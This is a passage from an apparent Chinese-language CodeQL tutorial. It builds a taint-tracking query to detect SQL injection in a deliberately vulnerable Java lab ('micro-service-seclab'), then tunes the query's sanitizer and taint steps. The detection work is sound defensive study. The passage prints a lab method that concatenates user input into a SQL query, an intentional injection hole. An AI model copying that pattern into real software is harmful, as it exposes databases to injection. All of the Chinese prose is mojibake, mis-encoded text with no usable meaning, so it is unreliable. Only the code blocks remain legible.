ç±»å†…ç½®çš„ä¸€äº›æ–¹æ³•ï¼ŒæŠŠç»“æœè¿‡æ»¤ä¸€ä¸‹ã€‚æ¯”å¦‚æˆ‘ä»¬è·å–åå­—ä¸º <code>getStudent</code> çš„æ–¹æ³•åç§°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;getStudent&quot;)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/getLimitedMethod.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">method.getName() <span class="comment">// è·å–çš„æ˜¯å½“å‰æ–¹æ³•çš„åç§°</span></span><br><span class="line">method.getDeclaringType() / è·å–çš„æ˜¯å½“å‰æ–¹æ³•æ‰€å±classçš„åç§°ã€‚</span><br></pre></td></tr></table></figure><h3 id="è°“è¯"><a href="#è°“è¯" class="headerlink" title="è°“è¯"></a>è°“è¯</h3><p>å’ŒSQLä¸€æ ·ï¼Œwhereéƒ¨åˆ†çš„æŸ¥è¯¢æ¡ä»¶å¦‚æœè¿‡é•¿ï¼Œä¼šæ˜¾å¾—å¾ˆä¹±ã€‚CodeQLæä¾›ä¸€ç§æœºåˆ¶å¯ä»¥è®©ä½ æŠŠå¾ˆé•¿çš„æŸ¥è¯¢è¯­å¥å°è£…æˆå‡½æ•°ã€‚</p><p>è¿™ä¸ªå‡½æ•°ï¼Œå°±å«è°“è¯ã€‚</p><p>æ¯”å¦‚ä¸Šé¢çš„æ¡ˆä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥å†™æˆå¦‚ä¸‹ï¼Œè·å¾—çš„ç»“æœè·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">predicate isStudent(Method method) &#123;</span><br><span class="line">exists(|method.hasName(&quot;getStudent&quot;))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where isStudent(method)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><blockquote><p>è¯­æ³•è§£é‡Š</p></blockquote><p><code>predicate</code> è¡¨ç¤ºå½“å‰æ–¹æ³•æ²¡æœ‰è¿”å›å€¼ã€‚<br><code>exists</code> å­æŸ¥è¯¢ï¼Œæ˜¯CodeQLè°“è¯è¯­æ³•é‡Œéå¸¸å¸¸è§çš„è¯­æ³•ç»“æ„ï¼Œå®ƒæ ¹æ®å†…éƒ¨çš„å­æŸ¥è¯¢è¿”å› <code>true or false</code>ï¼Œæ¥å†³å®šç­›é€‰å‡ºå“ªäº›æ•°æ®ã€‚</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/predicate.png" class><h3 id="è®¾ç½®-Source-å’Œ-Sink"><a href="#è®¾ç½®-Source-å’Œ-Sink" class="headerlink" title="è®¾ç½® Source å’Œ Sink"></a>è®¾ç½® Source å’Œ Sink</h3><p>ä»€ä¹ˆæ˜¯sourceå’Œsink</p><p>åœ¨ä»£ç è‡ªåŠ¨åŒ–å®‰å…¨å®¡è®¡çš„ç†è®ºå½“ä¸­ï¼Œæœ‰ä¸€ä¸ªæœ€æ ¸å¿ƒçš„ä¸‰å…ƒç»„æ¦‚å¿µï¼Œå°±æ˜¯(sourceï¼Œsinkå’Œsanitizer)ã€‚</p><p>source æ˜¯æŒ‡æ¼æ´æ±¡æŸ“é“¾æ¡çš„è¾“å…¥ç‚¹ã€‚æ¯”å¦‚è·å–httpè¯·æ±‚çš„å‚æ•°éƒ¨åˆ†ï¼Œå°±æ˜¯éå¸¸æ˜æ˜¾çš„Sourceã€‚</p><p>sink æ˜¯æŒ‡æ¼æ´æ±¡æŸ“é“¾æ¡çš„æ‰§è¡Œç‚¹ï¼Œæ¯”å¦‚SQLæ³¨å…¥æ¼æ´ï¼Œæœ€ç»ˆæ‰§è¡ŒSQLè¯­å¥çš„å‡½æ•°å°±æ˜¯sink(è¿™ä¸ªå‡½æ•°å¯èƒ½å«queryæˆ–è€…exeSqlï¼Œæˆ–è€…å…¶å®ƒ)ã€‚</p><p>sanitizeråˆå«å‡€åŒ–å‡½æ•°ï¼Œæ˜¯æŒ‡åœ¨æ•´ä¸ªçš„æ¼æ´é“¾æ¡å½“ä¸­ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªæ–¹æ³•é˜»æ–­äº†æ•´ä¸ªä¼ é€’é“¾ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•å°±å«sanitizerã€‚</p><p>åªæœ‰å½“sourceå’ŒsinkåŒæ—¶å­˜åœ¨ï¼Œå¹¶ä¸”ä»sourceåˆ°sinkçš„é“¾è·¯æ˜¯é€šçš„ï¼Œæ‰è¡¨ç¤ºå½“å‰æ¼æ´æ˜¯å­˜åœ¨çš„ã€‚</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/sourceToSink.png" class><ul><li>è®¾ç½® Source</li></ul><p>åœ¨ micro_service_seclab ä¸­ï¼Œå¯¹åº”çš„ Source ä¸¾ä¸ªä¾‹å­ï¼ŒSQL æ³¨å…¥çš„ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/one&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">one</span><span class="params">(<span class="meta">@RequestParam(value = &quot;username&quot;)</span> String username)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> indexLogic.getStudent(username);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹åº” CodeQL å½“ä¸­çš„ Source</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure><p><code>RemoteFlowSource</code>Â ç±»ï¼ˆåœ¨<code>semmle.code.java.dataflow.FlowSources</code>ï¼‰ä¸­å®šä¹‰ï¼‰è¡¨ç¤ºå¯èƒ½ç”±è¿œç¨‹ç”¨æˆ·æ§åˆ¶çš„æ•°æ®æµæºï¼Œè¿™é‡Œè¿™æ®µä»£ç çš„ä¼ å‚æ¯”è¾ƒç®€å•ï¼Œä½†å…¶å®ä¼ å‚å¦‚æœå¤æ‚ï¼Œæ¯”å¦‚æ˜¯ä¸€ä¸ªç±»çš„æƒ…å†µä¸‹ï¼Œä¹Ÿæ˜¯ç±»ä¼¼çš„</p><p>åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œsourceå°±æ˜¯<code>Student user</code>(userä¸ºStudentç±»å‹ï¼Œè¿™ä¸ªä¸å—å½±å“)ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(value = &quot;/object&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">objectParam</span><span class="params">(<span class="meta">@RequestBody</span> Student user)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> indexLogic.getStudent(user.getUsername());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>è®¾ç½® Sink</li></ul><p>åœ¨æœ¬æ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬çš„sinkåº”è¯¥ä¸º<code>query</code>æ–¹æ³•(Method)çš„è°ƒç”¨(MethodAccess)ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾ç½®Sinkä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">exists(Method method, MethodAccess call |</span><br><span class="line">  method.hasName(<span class="string">&quot;query&quot;</span>)</span><br><span class="line">  and</span><br><span class="line">  call.getMethod() = method and</span><br><span class="line">  sink.asExpr() = call.getArgument(<span class="number">0</span>)</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨ï¼šä»¥ä¸Šä»£ç ä½¿ç”¨äº†existså­æŸ¥è¯¢è¯­æ³•ï¼Œæ ¼å¼ä¸ºexists(Obj obj| somthing), ä¸Šé¢æŸ¥è¯¢çš„æ„æ€ä¸ºï¼šæŸ¥æ‰¾ä¸€ä¸ªquery()æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼Œå¹¶æŠŠå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®ä¸ºsinkã€‚ </p><p>åœ¨é¶åœºç³»ç»Ÿ(<code>micro-service-seclab</code>)ä¸­ï¼Œsinkå°±æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbcTemplate.query(sql, ROW_MAPPER);</span><br></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ä»¬æµ‹è¯•çš„æ³¨å…¥æ¼æ´ï¼Œå½“sourceå˜é‡æµå…¥è¿™ä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œæ‰ä¼šå‘ç”Ÿæ³¨å…¥æ¼æ´ï¼</p><h3 id="Flowæ•°æ®æµ"><a href="#Flowæ•°æ®æµ" class="headerlink" title="Flowæ•°æ®æµ"></a>Flowæ•°æ®æµ</h3><p>åœ¨è®¾ç½®å®Œ Source å’Œ Sink ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦ç¡®è®¤ Source åˆ° Sink æ˜¯èƒ½å¤Ÿèµ°é€šçš„ï¼Œè¿™ä¸€æ®µçš„è¿é€šå·¥ä½œå°±æ˜¯ CodeQL å¼•æ“æœ¬èº«æ¥å®Œæˆçš„ã€‚æˆ‘ä»¬é€šè¿‡ <code>config.hasFlowPath(source, sink)</code> æ–¹æ³•æ¥åˆ¤æ–­æ˜¯å¦è¿é€šã€‚</p><p>æ¯”å¦‚å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼ é€’ç»™ <code>config.hasFlowPath(source, sink)</code> æˆ‘ä»¬å®šä¹‰å¥½çš„sourceå’Œsinkï¼Œç³»ç»Ÿå°±ä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´äº†ã€‚</p><h2 id="0x03-CodeQL-è¯­å¥ä¼˜åŒ–"><a href="#0x03-CodeQL-è¯­å¥ä¼˜åŒ–" class="headerlink" title="0x03 CodeQL è¯­å¥ä¼˜åŒ–"></a>0x03 CodeQL è¯­å¥ä¼˜åŒ–</h2><h3 id="åˆæ­¥æˆæœ"><a href="#åˆæ­¥æˆæœ" class="headerlink" title="åˆæ­¥æˆæœ"></a>åˆæ­¥æˆæœ</h3><p>ç»è¿‡æ•´ç†ä¹‹åçš„ ql æŸ¥è¯¢ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     VulConfig() &#123; this = &quot;SqlInjectionConfig&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call |</span><br><span class="line">            method.hasName(&quot;query&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/Result.png" class><p>CodeQL åœ¨å®šä¹‰ç±»ä¸Šçš„è¯­æ³•å’Œ Java ç±»ä¼¼ï¼Œå…¶ä¸­ extends çš„çˆ¶ç±» <code>TaintTracking::Configuration</code> æ˜¯å®˜æ–¹æä¾›ç”¨æ¥åšæ•°æ®æµåˆ†æçš„é€šç”¨ç±»ï¼Œæä¾›å¾ˆå¤šæ•°æ®æµåˆ†æç›¸å…³çš„æ–¹æ³•ï¼Œæ¯”å¦‚isSource(å®šä¹‰source)ï¼ŒisSink(å®šä¹‰sink)</p><p><code>src instanceof RemoteFlowSource</code> è¡¨ç¤ºsrc å¿…é¡»æ˜¯ RemoteFlowSource ç±»å‹ã€‚åœ¨RemoteFlowSourceé‡Œï¼Œå®˜æ–¹æä¾›å¾ˆéå¸¸å…¨çš„sourceå®šä¹‰ï¼Œæˆ‘ä»¬æœ¬æ¬¡ç”¨åˆ°çš„Springbootçš„Sourceå°±å·²ç»æ¶µç›–äº†ã€‚</p><ul><li>æ³¨ï¼šä¸Šé¢çš„æ³¨é‡Šå’Œå…¶å®ƒè¯­è¨€æ˜¯ä¸ä¸€æ ·çš„ï¼Œä¸èƒ½å¤Ÿåˆ é™¤ï¼Œå®ƒæ˜¯ç¨‹åºçš„ä¸€éƒ¨åˆ†ï¼Œå› ä¸ºåœ¨æˆ‘ä»¬ç”Ÿæˆæµ‹è¯•æŠ¥å‘Šçš„æ—¶å€™ï¼Œä¸Šé¢æ³¨é‡Šå½“ä¸­çš„nameï¼Œdescriptionç­‰ä¿¡æ¯ä¼šå†™å…¥åˆ°å®¡è®¡æŠ¥å‘Šä¸­ã€‚</li></ul><h3 id="è¯¯æŠ¥è§£å†³"><a href="#è¯¯æŠ¥è§£å†³" class="headerlink" title="è¯¯æŠ¥è§£å†³"></a>è¯¯æŠ¥è§£å†³</h3><p>æ‰«æç»“æœå½“ä¸­å­˜åœ¨ä¸€é¡¹è¯¯æŠ¥</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/wubao.png" class><p>è¿™ä¸ªæ–¹æ³•çš„å‚æ•°ç±»å‹æ˜¯ <code>List&lt;Long&gt;</code>ï¼Œä¸å¯èƒ½å­˜åœ¨æ³¨å…¥æ¼æ´ã€‚</p><p>è¿™è¯´æ˜æˆ‘ä»¬çš„è§„åˆ™é‡Œï¼Œå¯¹äº <code>List&lt;Long&gt;</code> ï¼Œç”šè‡³ <code>List&lt;Integer&gt;</code> ç±»å‹éƒ½ä¼šäº§ç”Ÿè¯¯æŠ¥ï¼Œsource è¯¯æŠŠè¿™ç§ç±»å‹çš„å‚æ•°æ¶µç›–äº†ã€‚</p><p>æˆ‘ä»¬éœ€è¦é‡‡å–æ‰‹æ®µæ¶ˆé™¤è¿™ç§è¯¯æŠ¥ã€‚</p><p>è¿™ä¸ªæ‰‹æ®µå°±æ˜¯ <code>isSanitizer</code>ã€‚</p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/isSanitizer.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">isSanitizeræ˜¯CodeQLçš„ç±»TaintTracking::Configurationæä¾›çš„å‡€åŒ–æ–¹æ³•ã€‚å®ƒçš„å‡½æ•°åŸå‹æ˜¯ï¼š</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;&#125;</span><br><span class="line"></span><br><span class="line">åœ¨CodeQLè‡ªå¸¦çš„é»˜è®¤è§„åˆ™é‡Œï¼Œå¯¹å½“å‰èŠ‚ç‚¹æ˜¯å¦ä¸ºåŸºç¡€ç±»å‹åšäº†åˆ¤æ–­ã€‚</span><br><span class="line"></span><br><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">node.getType() instanceof PrimitiveType or</span><br><span class="line">node.getType() instanceof BoxedType or</span><br><span class="line">node.getType() instanceof NumberType</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">è¡¨ç¤ºå¦‚æœå½“å‰èŠ‚ç‚¹æ˜¯ä¸Šé¢æåˆ°çš„åŸºç¡€ç±»å‹ï¼Œé‚£ä¹ˆæ­¤æ±¡æŸ“é“¾å°†è¢«å‡€åŒ–é˜»æ–­ï¼Œæ¼æ´å°†ä¸å­˜åœ¨ã€‚</span><br></pre></td></tr></table></figure><p>ç”±äº CodeQL æ£€æµ‹SQLæ³¨å…¥é‡Œçš„ <code>isSanitizer</code> æ–¹æ³•ï¼Œåªå¯¹åŸºç¡€ç±»å‹åšäº†åˆ¤æ–­ï¼Œå¹¶æ²¡æœ‰å¯¹è¿™ç§å¤åˆç±»å‹åšåˆ¤æ–­ï¼Œæ‰å¼•èµ·äº†è¿™æ¬¡è¯¯æŠ¥é—®é¢˜ã€‚</p><p>é‚£æˆ‘ä»¬åªéœ€è¦å°†è¿™ç§å¤åˆç±»å‹åŠ å…¥åˆ° <code>isSanitizer</code> æ–¹æ³•ï¼Œå³å¯æ¶ˆé™¤è¿™ç§è¯¯æŠ¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof PrimitiveType or</span><br><span class="line">    node.getType() instanceof BoxedType or</span><br><span class="line">    node.getType() instanceof NumberType or</span><br><span class="line">    exists(ParameterizedType pt| node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType )  // è¿™é‡Œçš„ ParameterizedType ä»£è¡¨æ‰€æœ‰æ³›å‹ï¼Œåˆ¤æ–­æ³›å‹å½“ä¸­çš„ä¼ å‚æ˜¯å¦ä¸º Number å‹</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç çš„æ„æ€ä¸ºï¼šå¦‚æœå½“å‰nodeèŠ‚ç‚¹çš„ç±»å‹ä¸ºåŸºç¡€ç±»å‹ï¼Œæ•°å­—ç±»å‹å’Œæ³›å‹æ•°å­—ç±»å‹(æ¯”å¦‚List)æ—¶ï¼Œå°±åˆ‡æ–­æ•°æ®æµï¼Œè®¤ä¸ºæ•°æ®æµæ–­æ‰äº†ï¼Œä¸ä¼šç»§ç»­å¾€ä¸‹æ£€æµ‹ã€‚  </p><p>é‡æ–°æ‰§è¡Œqueryï¼Œæˆ‘ä»¬å‘ç°ï¼Œåˆšæ‰é‚£æ¡è¯¯æŠ¥å·²ç»è¢«æˆåŠŸæ¶ˆé™¤å•¦ã€‚</p><h3 id="æ¼æŠ¥è§£å†³"><a href="#æ¼æŠ¥è§£å†³" class="headerlink" title="æ¼æŠ¥è§£å†³"></a>æ¼æŠ¥è§£å†³</h3><p>æˆ‘ä»¬å‘ç°ï¼Œå¦‚ä¸‹çš„SQLæ³¨å…¥å¹¶æ²¡æœ‰è¢«CodeQLæ•æ‰åˆ°ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">getStudentWithOptional</span><span class="params">(Optional&lt;String&gt; username)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">sqlWithOptional</span> <span class="operator">=</span> <span class="string">&quot;select * from students where username like &#x27;%&quot;</span> + username.get() + <span class="string">&quot;%&#x27;&quot;</span>;</span><br><span class="line">        <span class="comment">//String sql = &quot;select * from students where username like ?&quot;;</span></span><br><span class="line">        <span class="keyword">return</span> jdbcTemplate.query(sqlWithOptional, ROW_MAPPER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ¼æŠ¥ç†è®ºä¸Šè®²æ˜¯ä¸èƒ½æ¥å—çš„ã€‚å¦‚æœå‡ºç°è¯¯æŠ¥æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡äººå·¥ç­›é€‰æ¥è§£å†³ï¼Œä½†æ˜¯æ¼æŠ¥ä¼šå¯¼è‡´å¾ˆå¤šæ¼æ´æµç»ä¸‹ä¸€ä¸ªç¯èŠ‚åˆ°çº¿ä¸Šï¼Œä»è€Œäº§ç”ŸæŸå¤±ã€‚</p><p>é‚£æˆ‘ä»¬å¦‚æœé€šè¿‡CodeQLæ¥è§£å†³æ¼æŠ¥é—®é¢˜å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯é€šè¿‡ <code>isAdditionalTaintStep</code> æ–¹æ³•ã€‚</p><p>å®ç°åŸç†å°±ä¸€å¥è¯ï¼š<strong>æ–­äº†å°±å¼ºåˆ¶ç»™å®ƒæ¥ä¸Šã€‚</strong></p><img src="/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/isAdditionalTaintStep.png" class><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">isAdditionalTaintStepæ–¹æ³•æ˜¯CodeQLçš„ç±»TaintTracking::Configurationæä¾›çš„çš„æ–¹æ³•ï¼Œå®ƒçš„åŸå‹æ˜¯ï¼š</span><br><span class="line"></span><br><span class="line">override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;&#125;</span><br><span class="line"></span><br><span class="line">å®ƒçš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªå¯æ§èŠ‚ç‚¹</span><br><span class="line">Aå¼ºåˆ¶ä¼ é€’ç»™å¦å¤–ä¸€ä¸ªèŠ‚ç‚¹Bï¼Œé‚£ä¹ˆèŠ‚ç‚¹Bä¹Ÿå°±æˆäº†å¯æ§èŠ‚ç‚¹ã€‚</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”±äº Optional è¿™ç§ç±»å‹çš„ä½¿ç”¨æ²¡æœ‰åœ¨ CodeQL çš„è¯­æ³•åº“é‡Œï¼Œæˆ‘ä»¬éœ€è¦å¼ºåˆ¶è®© <code>username</code> æµè½¬åˆ°<code>username.get()</code>ï¼Œè¿™æ · <code>username.get()</code> å°±å˜å¾—å¯æ§äº†ã€‚è¿™æ ·åº”è¯¥å°±èƒ½è¯†åˆ«å‡ºè¿™ä¸ªæ³¨å…¥æ¼æ´äº†ã€‚</p><p><strong>å®Œæ•´ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @id java/examples/vuldemo</span><br><span class="line"> * @name Sql-Injection</span><br><span class="line"> * @description Sql-Injection</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// è§£å†³ SQL æ³¨å…¥ QL è¯­å¥çš„æ¼ä¿</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.QueryInjection</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">predicate isTaintedString(Expr expSrc, Expr expDest) &#123;</span><br><span class="line">    exists(Method method, MethodAccess call, MethodAccess call1|</span><br><span class="line">        expSrc = call1.getArgument(0) and expDest = call and call.getMethod() = method</span><br><span class="line">        and method.hasName(&quot;get&quot;) and method.getDeclaringType().toString() = &quot;Optional&lt;String&gt;&quot;</span><br><span class="line">        and call1.getArgument(0).getType().toString() = &quot;Optional&lt;String&gt;&quot;</span><br><span class="line">        )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">     VulConfig() &#123; this = &quot;SqlInjectionConfig&quot;&#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123;</span><br><span class="line">        src instanceof RemoteFlowSource</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(Method method, MethodAccess call |</span><br><span class="line">            method.hasName(&quot;query&quot;)</span><br><span class="line">            and</span><br><span class="line">            call.getMethod() = method and</span><br><span class="line">            sink.asExpr() = call.getArgument(0)  // sink.asExpr() æ˜¯ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºå°†ä¸€ä¸ª sink è½¬æ¢æˆä¸€ä¸ªè¡¨è¾¾å¼ã€‚è¿™ä¸ªæ–¹æ³•é€šå¸¸ç”¨äºåœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨ sinkï¼Œå› ä¸ºæŸ¥è¯¢éœ€è¦å°† sink è½¬æ¢æˆè¡¨è¾¾å¼æ‰èƒ½è¿›è¡Œåˆ†æã€‚</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">        node.getType() instanceof PrimitiveType or</span><br><span class="line">        node.getType() instanceof BoxedType or</span><br><span class="line">        node.getType() instanceof NumberType or</span><br><span class="line">        exists(ParameterizedType pt| </span><br><span class="line">            node.getType() = pt and pt.getTypeArgument(0) instanceof NumberType</span><br><span class="line">         )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">        isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">    